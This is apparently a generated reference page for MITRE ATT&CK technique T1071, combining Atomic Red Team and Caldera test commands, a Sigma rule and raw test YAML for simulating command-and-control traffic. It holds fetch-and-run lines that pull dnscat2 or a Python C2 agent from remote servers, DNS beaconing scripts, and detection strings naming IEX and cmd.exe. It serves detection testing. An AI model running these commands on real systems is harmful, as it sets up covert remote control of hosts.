
# Standard Application Layer Protocol

## Description

### MITRE Description

> Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1071

## Potential Commands

```
Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | out-null
Invoke-WebRequest www.google.com -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
Invoke-WebRequest www.google.com -UserAgent "*<|>*" | out-null

curl -s -A "HttpBrowser/1.0" -m3 www.google.com >nul 2>&1
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com >nul 2>&1
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com >nul 2>&1
curl -s -A "*<|>*" -m3 www.google.com >nul 2>&1

curl -s -A "HttpBrowser/1.0" -m3 www.google.com
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
curl -s -A "*<|>*" -m3 www.google.com

for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io" -QuickTimeout}

for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}

for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}

None
Set-Location PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}

Set-Location PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain atomicredteam -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}

Set-Location PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}

None
None
None
Set-Location PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type}

Set-Location PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType #{query_type}

Set-Location PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT

IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain example.com -DNSServer #{server_ip}

IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer 127.0.0.1

{'darwin': {'sh': {'command': 'server="#{app.contact.http}";\ncurl -s -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n', 'cleanup': 'pkill -f ragdoll\n'}}, 'linux': {'sh': {'command': 'server="#{app.contact.http}";\ncurl -s -X POST -H "file:ragdoll.py" -H "platform:linux" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n', 'cleanup': 'pkill -f ragdoll\n'}}}
```

## Commands Dataset

```
[{'command': 'Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | '
             'out-null\n'
             'Invoke-WebRequest www.google.com -UserAgent "Wget/1.9+cvs-stable '
             '(Red Hat modified)" | out-null\n'
             'Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows '
             'NT 6.0; U; en)" | out-null\n'
             'Invoke-WebRequest www.google.com -UserAgent "*<|>*" | out-null\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'curl -s -A "HttpBrowser/1.0" -m3 www.google.com >nul 2>&1\n'
             'curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 '
             'www.google.com >nul 2>&1\n'
             'curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 '
             'www.google.com >nul 2>&1\n'
             'curl -s -A "*<|>*" -m3 www.google.com >nul 2>&1\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'curl -s -A "HttpBrowser/1.0" -m3 www.google.com\n'
             'curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 '
             'www.google.com\n'
             'curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 '
             'www.google.com\n'
             'curl -s -A "*<|>*" -m3 www.google.com\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type '
             '"#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum '
             '999999).127.0.0.1.xip.io" -QuickTimeout}\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type '
             '"#{query_type}" "atomicredteam.$(Get-Random -Minimum 1 -Maximum '
             '999999).#{domain}" -QuickTimeout}\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type '
             '"TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum '
             '999999).#{domain}" -QuickTimeout}\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': None, 'name': None, 'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io '
             '-Subdomain #{subdomain} -QueryType #{query_type} -C2Interval '
             '#{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain '
             'atomicredteam -QueryType #{query_type} -C2Interval '
             '#{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain '
             '#{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter '
             '#{c2_jitter} -RunTime #{runtime}\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': None, 'name': None, 'source': 'atomics/T1071/T1071.yaml'},
 {'command': None, 'name': None, 'source': 'atomics/T1071/T1071.yaml'},
 {'command': None, 'name': None, 'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain '
             '127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType '
             '#{query_type}\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} '
             '-Subdomain '
             'atomicredteamatomicredteamatomicredteamatomicredteamatomicredte '
             '-QueryType #{query_type}\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'Set-Location PathToAtomicsFolder\n'
             '.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} '
             '-Subdomain #{subdomain} -QueryType TXT\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'IEX (New-Object '
             "System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\n"
             'Start-Dnscat2 -Domain example.com -DNSServer #{server_ip}\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': 'IEX (New-Object '
             "System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\n"
             'Start-Dnscat2 -Domain #{domain} -DNSServer 127.0.0.1\n',
  'name': None,
  'source': 'atomics/T1071/T1071.yaml'},
 {'command': {'darwin': {'sh': {'cleanup': 'pkill -f ragdoll\n',
                                'command': 'server="#{app.contact.http}";\n'
                                           'curl -s -X POST -H '
                                           '"file:ragdoll.py" -H '
                                           '"platform:darwin" '
                                           '$server/file/download > '
                                           'ragdoll.py;\n'
                                           'pip install requests '
                                           'beautifulsoup4;\n'
                                           'python ragdoll.py -W '
                                           '$server#{app.contact.html}\n'}},
              'linux': {'sh': {'cleanup': 'pkill -f ragdoll\n',
                               'command': 'server="#{app.contact.http}";\n'
                                          'curl -s -X POST -H '
                                          '"file:ragdoll.py" -H '
                                          '"platform:linux" '
                                          '$server/file/download > '
                                          'ragdoll.py;\n'
                                          'pip install requests '
                                          'beautifulsoup4;\n'
                                          'python ragdoll.py -W '
                                          '$server#{app.contact.html}\n'}}},
  'name': 'A Python agent which communicates via the HTML contact',
  'source': 'data/abilities/command-and-control/0ab383be-b819-41bf-91b9-1bd4404d83bf.yml'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Markus Neis',
                  'date': '2018/08/08',
                  'description': 'Detects strings used in command execution in '
                                 'DNS TXT Answer',
                  'detection': {'condition': 'selection',
                                'selection': {'answer': ['*IEX*',
                                                         '*Invoke-Expression*',
                                                         '*cmd.exe*'],
                                              'record_type': 'TXT'}},
                  'falsepositives': ['Unknown'],
                  'id': '8ae51330-899c-4641-8125-e39f2e07da72',
                  'level': 'high',
                  'logsource': {'category': 'dns'},
                  'references': ['https://twitter.com/stvemillertime/status/1024707932447854592',
                                 'https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1'],
                  'status': 'experimental',
                  'tags': ['attack.t1071'],
                  'title': 'DNS TXT Answer with possible execution strings'}},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Network intrusion detection system']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Network intrusion detection system']},
 {'data_source': ['Network protocol analysis']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Standard Application Layer Protocol': {'atomic_tests': [{'auto_generated_guid': '81c13829-f6c9-45b8-85a6-053366d55297',
                                                                                   'description': 'This '
                                                                                                  'test '
                                                                                                  'simulates '
                                                                                                  'an '
                                                                                                  'infected '
                                                                                                  'host '
                                                                                                  'beaconing '
                                                                                                  'to '
                                                                                                  'command '
                                                                                                  'and '
                                                                                                  'control. '
                                                                                                  'Upon '
                                                                                                  'execution, '
                                                                                                  'no '
                                                                                                  'output '
                                                                                                  'will '
                                                                                                  'be '
                                                                                                  'displayed. \n'
                                                                                                  'Use '
                                                                                                  'an '
                                                                                                  'application '
                                                                                                  'such '
                                                                                                  'as '
                                                                                                  'Wireshark '
                                                                                                  'to '
                                                                                                  'record '
                                                                                                  'the '
                                                                                                  'session '
                                                                                                  'and '
                                                                                                  'observe '
                                                                                                  'user '
                                                                                                  'agent '
                                                                                                  'strings '
                                                                                                  'and '
                                                                                                  'responses.\n'
                                                                                                  '\n'
                                                                                                  'Inspired '
                                                                                                  'by '
                                                                                                  'APTSimulator '
                                                                                                  '- '
                                                                                                  'https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n',
                                                                                   'executor': {'command': 'Invoke-WebRequest '
                                                                                                           '#{domain} '
                                                                                                           '-UserAgent '
                                                                                                           '"HttpBrowser/1.0" '
                                                                                                           '| '
                                                                                                           'out-null\n'
                                                                                                           'Invoke-WebRequest '
                                                                                                           '#{domain} '
                                                                                                           '-UserAgent '
                                                                                                           '"Wget/1.9+cvs-stable '
                                                                                                           '(Red '
                                                                                                           'Hat '
                                                                                                           'modified)" '
                                                                                                           '| '
                                                                                                           'out-null\n'
                                                                                                           'Invoke-WebRequest '
                                                                                                           '#{domain} '
                                                                                                           '-UserAgent '
                                                                                                           '"Opera/8.81 '
                                                                                                           '(Windows '
                                                                                                           'NT '
                                                                                                           '6.0; '
                                                                                                           'U; '
                                                                                                           'en)" '
                                                                                                           '| '
                                                                                                           'out-null\n'
                                                                                                           'Invoke-WebRequest '
                                                                                                           '#{domain} '
                                                                                                           '-UserAgent '
                                                                                                           '"*<|>*" '
                                                                                                           '| '
                                                                                                           'out-null\n',
                                                                                                'elevation_required': False,
                                                                                                'name': 'powershell'},
                                                                                   'input_arguments': {'domain': {'default': 'www.google.com',
                                                                                                                  'description': 'Default '
                                                                                                                                 'domain '
                                                                                                                                 'to '
                                                                                                                                 'simulate '
                                                                                                                                 'against',
                                                                                                                  'type': 'string'}},
                                                                                   'name': 'Malicious '
                                                                                           'User '
                                                                                           'Agents '
                                                                                           '- '
                                                                                           'Powershell',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': 'dc3488b0-08c7-4fea-b585-905c83b48180',
                                                                                   'description': 'This '
                                                                                                  'test '
                                                                                                  'simulates '
                                                                                                  'an '
                                                                                                  'infected '
                                                                                                  'host '
                                                                                                  'beaconing '
                                                                                                  'to '
                                                                                                  'command '
                                                                                                  'and '
                                                                                                  'control. '
                                                                                                  'Upon '
                                                                                                  'execution, '
                                                                                                  'no '
                                                                                                  'out '
                                                                                                  'put '
                                                                                                  'will '
                                                                                                  'be '
                                                                                                  'displayed. \n'
                                                                                                  'Use '
                                                                                                  'an '
                                                                                                  'application '
                                                                                                  'such '
                                                                                                  'as '
                                                                                                  'Wireshark '
                                                                                                  'to '
                                                                                                  'record '
                                                                                                  'the '
                                                                                                  'session '
                                                                                                  'and '
                                                                                                  'observe '
                                                                                                  'user '
                                                                                                  'agent '
                                                                                                  'strings '
                                                                                                  'and '
                                                                                                  'responses.\n'
                                                                                                  '\n'
                                                                                                  'Inspired '
                                                                                                  'by '
                                                                                                  'APTSimulator '
                                                                                                  '- '
                                                                                                  'https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n',
                                                                                   'executor': {'command': 'curl '
                                                                                                           '-s '
                                                                                                           '-A '
                                                                                                           '"HttpBrowser/1.0" '
                                                                                                           '-m3 '
                                                                                                           '#{domain} '
                                                                                                           '>nul '
                                                                                                           '2>&1\n'
                                                                                                           'curl '
                                                                                                           '-s '
                                                                                                           '-A '
                                                                                                           '"Wget/1.9+cvs-stable '
                                                                                                           '(Red '
                                                                                                           'Hat '
                                                                                                           'modified)" '
                                                                                                           '-m3 '
                                                                                                           '#{domain} '
                                                                                                           '>nul '
                                                                                                           '2>&1\n'
                                                                                                           'curl '
                                                                                                           '-s '
                                                                                                           '-A '
                                                                                                           '"Opera/8.81 '
                                                                                                           '(Windows '
                                                                                                           'NT '
                                                                                                           '6.0; '
                                                                                                           'U; '
                                                                                                           'en)" '
                                                                                                           '-m3 '
                                                                                                           '#{domain} '
                                                                                                           '>nul '
                                                                                                           '2>&1\n'
                                                                                                           'curl '
                                                                                                           '-s '
                                                                                                           '-A '
                                                                                                           '"*<|>*" '
                                                                                                           '-m3 '
                                                                                                           '#{domain} '
                                                                                                           '>nul '
                                                                                                           '2>&1\n',
                                                                                                'name': 'command_prompt'},
                                                                                   'input_arguments': {'domain': {'default': 'www.google.com',
                                                                                                                  'description': 'Default '
                                                                                                                                 'domain '
                                                                                                                                 'to '
                                                                                                                                 'simulate '
                                                                                                                                 'against',
                                                                                                                  'type': 'string'}},
                                                                                   'name': 'Malicious '
                                                                                           'User '
                                                                                           'Agents '
                                                                                           '- '
                                                                                           'CMD',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': '2d7c471a-e887-4b78-b0dc-b0df1f2e0658',
                                                                                   'description': 'This '
                                                                                                  'test '
                                                                                                  'simulates '
                                                                                                  'an '
                                                                                                  'infected '
                                                                                                  'host '
                                                                                                  'beaconing '
                                                                                                  'to '
                                                                                                  'command '
                                                                                                  'and '
                                                                                                  'control.\n'
                                                                                                  'Inspired '
                                                                                                  'by '
                                                                                                  'APTSimulator '
                                                                                                  '- '
                                                                                                  'https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n',
                                                                                   'executor': {'command': 'curl '
                                                                                                           '-s '
                                                                                                           '-A '
                                                                                                           '"HttpBrowser/1.0" '
                                                                                                           '-m3 '
                                                                                                           '#{domain}\n'
                                                                                                           'curl '
                                                                                                           '-s '
                                                                                                           '-A '
                                                                                                           '"Wget/1.9+cvs-stable '
                                                                                                           '(Red '
                                                                                                           'Hat '
                                                                                                           'modified)" '
                                                                                                           '-m3 '
                                                                                                           '#{domain}\n'
                                                                                                           'curl '
                                                                                                           '-s '
                                                                                                           '-A '
                                                                                                           '"Opera/8.81 '
                                                                                                           '(Windows '
                                                                                                           'NT '
                                                                                                           '6.0; '
                                                                                                           'U; '
                                                                                                           'en)" '
                                                                                                           '-m3 '
                                                                                                           '#{domain}\n'
                                                                                                           'curl '
                                                                                                           '-s '
                                                                                                           '-A '
                                                                                                           '"*<|>*" '
                                                                                                           '-m3 '
                                                                                                           '#{domain}\n',
                                                                                                'name': 'sh'},
                                                                                   'input_arguments': {'domain': {'default': 'www.google.com',
                                                                                                                  'description': 'Default '
                                                                                                                                 'domain '
                                                                                                                                 'to '
                                                                                                                                 'simulate '
                                                                                                                                 'against',
                                                                                                                  'type': 'string'}},
                                                                                   'name': 'Malicious '
                                                                                           'User '
                                                                                           'Agents '
                                                                                           '- '
                                                                                           'Nix',
                                                                                   'supported_platforms': ['linux',
                                                                                                           'macos']},
                                                                                  {'auto_generated_guid': '1700f5d6-5a44-487b-84de-bc66f507b0a6',
                                                                                   'description': 'This '
                                                                                                  'test '
                                                                                                  'simulates '
                                                                                                  'an '
                                                                                                  'infected '
                                                                                                  'host '
                                                                                                  'sending '
                                                                                                  'a '
                                                                                                  'large '
                                                                                                  'volume '
                                                                                                  'of '
                                                                                                  'DNS '
                                                                                                  'queries '
                                                                                                  'to '
                                                                                                  'a '
                                                                                                  'command '
                                                                                                  'and '
                                                                                                  'control '
                                                                                                  'server.\n'
                                                                                                  'The '
                                                                                                  'intent '
                                                                                                  'of '
                                                                                                  'this '
                                                                                                  'test '
                                                                                                  'is '
                                                                                                  'to '
                                                                                                  'trigger '
                                                                                                  'threshold '
                                                                                                  'based '
                                                                                                  'detection '
                                                                                                  'on '
                                                                                                  'the '
                                                                                                  'number '
                                                                                                  'of '
                                                                                                  'DNS '
                                                                                                  'queries '
                                                                                                  'either '
                                                                                                  'from '
                                                                                                  'a '
                                                                                                  'single '
                                                                                                  'source '
                                                                                                  'system '
                                                                                                  'or '
                                                                                                  'to '
                                                                                                  'a '
                                                                                                  'single '
                                                                                                  'targe '
                                                                                                  'domain.\n'
                                                                                                  'A '
                                                                                                  'custom '
                                                                                                  'domain '
                                                                                                  'and '
                                                                                                  'sub-domain '
                                                                                                  'will '
                                                                                                  'need '
                                                                                                  'to '
                                                                                                  'be '
                                                                                                  'passed '
                                                                                                  'as '
                                                                                                  'input '
                                                                                                  'parameters '
                                                                                                  'for '
                                                                                                  'this '
                                                                                                  'test '
                                                                                                  'to '
                                                                                                  'work. '
                                                                                                  'Upon '
                                                                                                  'execution, '
                                                                                                  'DNS '
                                                                                                  'information '
                                                                                                  'about '
                                                                                                  'the '
                                                                                                  'domain '
                                                                                                  'will '
                                                                                                  'be '
                                                                                                  'displayed '
                                                                                                  'for '
                                                                                                  'each '
                                                                                                  'callout.\n',
                                                                                   'executor': {'command': 'for($i=0; '
                                                                                                           '$i '
                                                                                                           '-le '
                                                                                                           '#{query_volume}; '
                                                                                                           '$i++) '
                                                                                                           '{ '
                                                                                                           'Resolve-DnsName '
                                                                                                           '-type '
                                                                                                           '"#{query_type}" '
                                                                                                           '"#{subdomain}.$(Get-Random '
                                                                                                           '-Minimum '
                                                                                                           '1 '
                                                                                                           '-Maximum '
                                                                                                           '999999).#{domain}" '
                                                                                                           '-QuickTimeout}\n',
                                                                                                'elevation_required': False,
                                                                                                'name': 'powershell'},
                                                                                   'input_arguments': {'domain': {'default': '127.0.0.1.xip.io',
                                                                                                                  'description': 'Default '
                                                                                                                                 'domain '
                                                                                                                                 'to '
                                                                                                                                 'simulate '
                                                                                                                                 'against',
                                                                                                                  'type': 'string'},
                                                                                                       'query_type': {'default': 'TXT',
                                                                                                                      'description': 'DNS '
                                                                                                                                     'query '
                                                                                                                                     'type',
                                                                                                                      'type': 'string'},
                                                                                                       'query_volume': {'default': 1000,
                                                                                                                        'description': 'Number '
                                                                                                                                       'of '
                                                                                                                                       'DNS '
                                                                                                                                       'queries '
                                                                                                                                       'to '
                                                                                                                                       'send',
                                                                                                                        'type': 'integer'},
                                                                                                       'subdomain': {'default': 'atomicredteam',
                                                                                                                     'description': 'Subdomain '
                                                                                                                                    'prepended '
                                                                                                                                    'to '
                                                                                                                                    'the '
                                                                                                                                    'domain '
                                                                                                                                    'name',
                                                                                                                     'type': 'string'}},
                                                                                   'name': 'DNS '
                                                                                           'Large '
                                                                                           'Query '
                                                                                           'Volume',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': '3efc144e-1af8-46bb-8ca2-1376bb6db8b6',
                                                                                   'description': 'This '
                                                                                                  'test '
                                                                                                  'simulates '
                                                                                                  'an '
                                                                                                  'infected '
                                                                                                  'host '
                                                                                                  'beaconing '
                                                                                                  'via '
                                                                                                  'DNS '
                                                                                                  'queries '
                                                                                                  'to '
                                                                                                  'a '
                                                                                                  'command '
                                                                                                  'and '
                                                                                                  'control '
                                                                                                  'server '
                                                                                                  'at '
                                                                                                  'regular '
                                                                                                  'intervals '
                                                                                                  'over '
                                                                                                  'time.\n'
                                                                                                  'This '
                                                                                                  'behaviour '
                                                                                                  'is '
                                                                                                  'typical '
                                                                                                  'of '
                                                                                                  'implants '
                                                                                                  'either '
                                                                                                  'in '
                                                                                                  'an '
                                                                                                  'idle '
                                                                                                  'state '
                                                                                                  'waiting '
                                                                                                  'for '
                                                                                                  'instructions '
                                                                                                  'or '
                                                                                                  'configured '
                                                                                                  'to '
                                                                                                  'use '
                                                                                                  'a '
                                                                                                  'low '
                                                                                                  'query '
                                                                                                  'volume '
                                                                                                  'over '
                                                                                                  'time '
                                                                                                  'to '
                                                                                                  'evade '
                                                                                                  'threshold '
                                                                                                  'based '
                                                                                                  'detection.\n'
                                                                                                  'A '
                                                                                                  'custom '
                                                                                                  'domain '
                                                                                                  'and '
                                                                                                  'sub-domain '
                                                                                                  'will '
                                                                                                  'need '
                                                                                                  'to '
                                                                                                  'be '
                                                                                                  'passed '
                                                                                                  'as '
                                                                                                  'input '
                                                                                                  'parameters '
                                                                                                  'for '
                                                                                                  'this '
                                                                                                  'test '
                                                                                                  'to '
                                                                                                  'work. '
                                                                                                  'Upon '
                                                                                                  'execution, '
                                                                                                  'DNS '
                                                                                                  'information '
                                                                                                  'about '
                                                                                                  'the '
                                                                                                  'domain '
                                                                                                  'will '
                                                                                                  'be '
                                                                                                  'displayed '
                                                                                                  'for '
                                                                                                  'each '
                                                                                                  'callout.\n',
                                                                                   'executor': {'command': 'Set-Location '
                                                                                                           'PathToAtomicsFolder\n'
                                                                                                           '.\\T1071\\src\\T1071-dns-beacon.ps1 '
                                                                                                           '-Domain '
                                                                                                           '#{domain} '
                                                                                                           '-Subdomain '
                                                                                                           '#{subdomain} '
                                                                                                           '-QueryType '
                                                                                                           '#{query_type} '
                                                                                                           '-C2Interval '
                                                                                                           '#{c2_interval} '
                                                                                                           '-C2Jitter '
                                                                                                           '#{c2_jitter} '
                                                                                                           '-RunTime '
                                                                                                           '#{runtime}\n',
                                                                                                'elevation_required': False,
                                                                                                'name': 'powershell'},
                                                                                   'input_arguments': {'c2_interval': {'default': 30,
                                                                                                                       'description': 'Seconds '
                                                                                                                                      'between '
                                                                                                                                      'C2 '
                                                                                                                                      'requests '
                                                                                                                                      'to '
                                                                                                                                      'the '
                                                                                                                                      'command '
                                                                                                                                      'and '
                                                                                                                                      'control '
                                                                                                                                      'server',
                                                                                                                       'type': 'integer'},
                                                                                                       'c2_jitter': {'default': 20,
                                                                                                                     'description': 'Percentage '
                                                                                                                                    'of '
                                                                                                                                    'jitter '
                                                                                                                                    'to '
                                                                                                                                    'add '
                                                                                                                                    'to '
                                                                                                                                    'the '
                                                                                                                                    'C2 '
                                                                                                                                    'interval '
                                                                                                                                    'to '
                                                                                                                                    'create '
                                                                                                                                    'variance '
                                                                                                                                    'in '
                                                                                                                                    'the '
                                                                                                                                    'times '
                                                                                                                                    'between '
                                                                                                                                    'C2 '
                                                                                                                                    'requests',
                                                                                                                     'type': 'integer'},
                                                                                                       'domain': {'default': '127.0.0.1.xip.io',
                                                                                                                  'description': 'Default '
                                                                                                                                 'domain '
                                                                                                                                 'to '
                                                                                                                                 'simulate '
                                                                                                                                 'against',
                                                                                                                  'type': 'string'},
                                                                                                       'query_type': {'default': 'TXT',
                                                                                                                      'description': 'DNS '
                                                                                                                                     'query '
                                                                                                                                     'type',
                                                                                                                      'type': 'string'},
                                                                                                       'runtime': {'default': 30,
                                                                                                                   'description': 'Time '
                                                                                                                                  'in '
                                                                                                                                  'minutes '
                                                                                                                                  'to '
                                                                                                                                  'run '
                                                                                                                                  'the '
                                                                                                                                  'simulation',
                                                                                                                   'type': 'integer'},
                                                                                                       'subdomain': {'default': 'atomicredteam',
                                                                                                                     'description': 'Subdomain '
                                                                                                                                    'prepended '
                                                                                                                                    'to '
                                                                                                                                    'the '
                                                                                                                                    'domain '
                                                                                                                                    'name',
                                                                                                                     'type': 'string'}},
                                                                                   'name': 'DNS '
                                                                                           'Regular '
                                                                                           'Beaconing',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': 'fef31710-223a-40ee-8462-a396d6b66978',
                                                                                   'description': 'This '
                                                                                                  'test '
                                                                                                  'simulates '
                                                                                                  'an '
                                                                                                  'infected '
                                                                                                  'host '
                                                                                                  'returning '
                                                                                                  'data '
                                                                                                  'to '
                                                                                                  'a '
                                                                                                  'command '
                                                                                                  'and '
                                                                                                  'control '
                                                                                                  'server '
                                                                                                  'using '
                                                                                                  'long '
                                                                                                  'domain '
                                                                                                  'names.\n'
                                                                                                  'The '
                                                                                                  'simulation '
                                                                                                  'involves '
                                                                                                  'sending '
                                                                                                  'DNS '
                                                                                                  'queries '
                                                                                                  'that '
                                                                                                  'gradually '
                                                                                                  'increase '
                                                                                                  'in '
                                                                                                  'length '
                                                                                                  'until '
                                                                                                  'reaching '
                                                                                                  'the '
                                                                                                  'maximum '
                                                                                                  'length. '
                                                                                                  'The '
                                                                                                  'intent '
                                                                                                  'is '
                                                                                                  'to '
                                                                                                  'test '
                                                                                                  'the '
                                                                                                  'effectiveness '
                                                                                                  'of '
                                                                                                  'detection '
                                                                                                  'of '
                                                                                                  'DNS '
                                                                                                  'queries '
                                                                                                  'for '
                                                                                                  'long '
                                                                                                  'domain '
                                                                                                  'names '
                                                                                                  'over '
                                                                                                  'a '
                                                                                                  'set '
                                                                                                  'threshold.\n'
                                                                                                  ' '
                                                                                                  'Upon '
                                                                                                  'execution, '
                                                                                                  'DNS '
                                                                                                  'information '
                                                                                                  'about '
                                                                                                  'the '
                                                                                                  'domain '
                                                                                                  'will '
                                                                                                  'be '
                                                                                                  'displayed '
                                                                                                  'for '
                                                                                                  'each '
                                                                                                  'callout.\n',
                                                                                   'executor': {'command': 'Set-Location '
                                                                                                           'PathToAtomicsFolder\n'
                                                                                                           '.\\T1071\\src\\T1071-dns-domain-length.ps1 '
                                                                                                           '-Domain '
                                                                                                           '#{domain} '
                                                                                                           '-Subdomain '
                                                                                                           '#{subdomain} '
                                                                                                           '-QueryType '
                                                                                                           '#{query_type}\n',
                                                                                                'elevation_required': False,
                                                                                                'name': 'powershell'},
                                                                                   'input_arguments': {'domain': {'default': '127.0.0.1.xip.io',
                                                                                                                  'description': 'Default '
                                                                                                                                 'domain '
                                                                                                                                 'to '
                                                                                                                                 'simulate '
                                                                                                                                 'against',
                                                                                                                  'type': 'string'},
                                                                                                       'query_type': {'default': 'TXT',
                                                                                                                      'description': 'DNS '
                                                                                                                                     'query '
                                                                                                                                     'type',
                                                                                                                      'type': 'string'},
                                                                                                       'subdomain': {'default': 'atomicredteamatomicredteamatomicredteamatomicredteamatomicredte',
                                                                                                                     'description': 'Subdomain '
